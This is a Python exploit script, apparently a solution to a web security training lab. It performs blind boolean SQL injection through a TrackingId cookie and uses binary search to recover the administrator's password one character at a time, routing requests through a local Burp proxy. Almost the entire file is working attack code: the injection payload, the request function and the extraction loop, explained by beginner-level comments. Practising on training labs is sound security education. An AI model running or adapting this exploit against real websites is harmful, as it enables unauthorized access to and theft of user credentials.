#!/bin/env/python
# -*- coding: utf-8 -*- 
import requests
import sys

"""
    This script looks for the password of the administrator account by using a binary search.
    It looks for the password by looking at the ascii table and looking for the middle of the table, then it looks to see if the password is greater than the middle of the table.
    If it is then it looks at the middle of the table and the max of the table, if it is not then it looks at the middle of the table and the min of the table.
    It keeps doing this until it finds the password. It does this by using the tracking id cookie and the substring function.
    It looks at each character of the password and looks to see if it is greater than the character it is looking for.
    For the final letter, when min=max it checks if the returned character is equal to one less than the previous character as this has to be true, as the min and max are the same. If it isn't true then a match will never happen and it prints out the password.
    """


def is_greater_than_char(base_url: str, i: int, character:str) -> bool: #this function looks through each integer of the password string looking if its greater than the character we are looking for. it returns a boolean value of true if the text Welcome back is displayed in the response
    response = requests.get(
        base_url,
        cookies={"TrackingId": f"1' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) > '{chr(character)}"},#this is the payload, we are using the tracking id cookie to inject the payload. the i and i is the positional argument for the substring function. it is the number we are looking for. the 1 is set to 1 character as we want 1 character eac time
        proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},# this is a dict object, used for Burp
        verify=False,
        )
    return "Welcome back!" in response.text
    
    
    
def main() -> None: 
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>") #this is the usage statement if the user does not enter the correct number of arguments
        exit(1)
    requests.packages.urllib3.disable_warnings()
    password = "" #this is the password which will be built up
    for i in range(1,100): #this is the loop which will iterate through the characters in the password
        min_char = 32 #this is the min character in the ascii table. 
        max_char = 127 #this is the max character in the ascii table, so the max char of what the password could be
        while min_char != max_char: #when min char= max char then we have found the character
            
            char = (min_char + max_char) // 2 #this is the middle of the range of characters, ie looking for the middle of the ascii table (127) eg for a to z looking for m
            result= is_greater_than_char(sys.argv[1].rstrip("/"),i,char) #this is the base url, the rstrip removes the / from the end of the url if it is there, also i and char are called here
            
            if result: #if the result is true then the char is greater than the char we are looking for
                min_char = char+1 #so the min char is now the char we are looking for, as the min needs to go up to the char we are looking for
            else:
                max_char = char #if the result is false then the max char is now the char we are looking for, as the max needs to go down to the char we are looking for
        result= is_greater_than_char(sys.argv[1].rstrip("/"),i,char-1)# this checks if the value is true by checking is its greater than the previous one, when min char = max char
        if result:
            password =password+chr(min_char) #this is the password which will be built up, we are convertng it as 41 is ASCII is A, we're adding on the letter to the password
        else:
            print(password)
            return
if __name__ == "__main__":
    main()

